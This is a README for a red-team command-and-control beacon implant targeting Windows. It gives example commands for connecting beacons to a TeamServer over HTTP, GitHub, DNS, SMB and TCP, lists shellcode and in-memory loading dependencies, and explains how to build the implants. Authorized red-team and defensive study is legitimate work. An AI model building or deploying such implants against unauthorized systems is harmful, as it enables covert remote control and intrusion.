# Exploration C2 Implant

## Overview

**Exploration** is a lightweight, modular Command and Control (C2) framework designed for red team operations. This repository provides the **Beacon** component implemented in C++ for targeting Windows systems. The corresponding TeamServer and Client components are available in the [C2TeamServer](https://github.com/maxDcb/C2TeamServer) repository.

This project includes multiple Beacons capable of communicating with the TeamServer through a variety of channels. Supported communication methods include HTTP/HTTPS, GitHub, DNS, SMB, and TCP.

## Communication Examples

```bash
# HTTP/HTTPS
BeaconHttp.exe <TEAMSERVER_IP> <LISTENER_PORT> <http|https>
BeaconHttp.exe 10.10.10.10 8443 https
BeaconHttp.exe 10.10.10.10 8080 http

# GitHub
BeaconGithub.exe <GITHUB_USER/REPO> <ACCESS_TOKEN>
BeaconGithub.exe maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...

# DNS
BeaconDns.exe <DNS_SERVER> <TEAMSERVER_DOMAIN>
BeaconDns.exe 8.8.8.8 bac.superdomain.com

# SMB
BeaconSmb.exe <LISTENER_IP> <PIPE_NAME>
BeaconSmb.exe 127.0.0.1 pipename

# TCP
BeaconTcp.exe <LISTENER_IP> <LISTENER_PORT>
BeaconTcp.exe 127.0.0.1 4444
```

## Build Instructions

### Submodules & External Dependencies

This project relies on several third-party libraries and tools:

* [Donut](https://github.com/TheWover/donut): Generates shellcode from PE files.
* [COFFLoader](https://github.com/trustedsec/COFFLoader): Executes object files such as those in [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
* [MemoryModule](https://github.com/fancycode/MemoryModule): Enables runtime DLL loading.
* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell): Executes PowerShell from unmanaged code.
* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): Base64 encoding/decoding, built locally as the `c2_base64` CMake target.
* [libssh2](https://libssh2.org/): SSH client support for the `SshExec` module, provided by Conan.
* [nlohmann/json](https://github.com/nlohmann/json): JSON parsing, provided by Conan.

### Preparing the Environment

Install prerequisites:

* [Chocolatey](https://chocolatey.org/install)
* CMake
* Conan 2
* Visual Studio 2022 with the C++ toolchain

```bash
choco install cmake --pre
python -m pip install --user conan
```

Initialize submodules:

```bash
git submodule update --init
```

### Building the Windows Beacons and Modules

The supported local configuration is `Release` with the static MSVC runtime (`/MT`). The top-level CMake file configures Conan so `libssh2`, OpenSSL/zlib transitive dependencies, and local targets use the same runtime.

#### Windows x64

Using the "x64 Native Tools Command Prompt for VS":

```bash
cmake -S . -B build-conan -G "Visual Studio 17 2022"
cmake --build build-conan --config Release -- /m
```

From WSL, prefer the Visual Studio CMake executable so the generated paths stay Windows-native:

```bash
'/mnt/c/Program Files/Microsoft Visual Studio/2022/Community/Common7/IDE/CommonExtensions/Microsoft/CMake/CMake/bin/cmake.exe' \
  -S E:/Dev/C2Implant \
  -B E:/Dev/C2Implant/build-conan \
  -G "Visual Studio 17 2022"

'/mnt/c/Program Files/Microsoft Visual Studio/2022/Community/Common7/IDE/CommonExtensions/Microsoft/CMake/CMake/bin/cmake.exe' \
  --build E:/Dev/C2Implant/build-conan \
  --config Release \
  -- /m
```

#### Windows x86

```bash
cmake -S . -B build-conan-x86 -G "Visual Studio 17 2022" -A Win32
cmake --build build-conan-x86 --config Release -- /m
```

### Conan Notes

Dependencies are declared in `conanfile.txt`. The CMake provider runs `conan install` automatically during configuration.

For Visual Studio generators, only the `Release` Conan configuration is installed by default. If you need a Debug build, configure with a cache override such as:

```bash
cmake -S . -B build-conan -G "Visual Studio 17 2022" -DCONAN_INSTALL_CONFIGURATIONS="Release;Debug"
```

Do not manually force `/MT` through `CMAKE_CXX_FLAGS`; the project uses `CMAKE_MSVC_RUNTIME_LIBRARY` before `project()` so Conan detects the correct runtime.

### Output Locations

* Compiled Beacons: `Release\Beacons`
* Compiled Module DLLs: `Release\Modules`
